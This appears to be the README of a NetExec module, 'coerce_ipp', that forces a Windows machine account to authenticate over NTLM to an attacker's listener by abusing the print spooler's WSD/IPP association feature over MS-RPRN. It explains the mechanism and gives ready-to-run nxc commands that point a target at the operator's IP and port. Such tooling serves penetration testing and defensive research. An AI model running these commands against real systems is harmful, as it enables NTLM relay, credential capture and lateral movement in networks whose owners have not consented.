# coerce_ipp

NetExec module that coerces a Windows machine account into authenticating over HTTP (NTLM) by abusing the print spooler's WSD / IPP directed association feature.

Remote version of the technique from [BOF-coerce-ipp](https://github.com/sudonoodle/BOF-coerce-ipp).

## How it works

Opens an Xcv handle to the WSD Port monitor over MS-RPRN (`\\target\,XcvMonitor WSD Port`) and calls `AssocIppDirected` with an `ipp://` URI pointing at your listener. The target machine account then makes an outbound HTTP connection and performs NTLM authentication.

Requires admin (or equivalent) on the target. Regular domain users will fail to open the Xcv handle.

## Usage

```bash
# basic
nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip>

# custom port / path
nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip> PORT=8080
nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip> PORT=80 PATH=/print

<img width="678" height="156" alt="image" src="https://github.com/user-attachments/assets/d1f6c964-f85e-40e2-b8d4-f28622e2ed31" />


<img width="1557" height="117" alt="image" src="https://github.com/user-attachments/assets/439ddbdc-6c9b-4f51-a64e-575a30ca0d3b" />
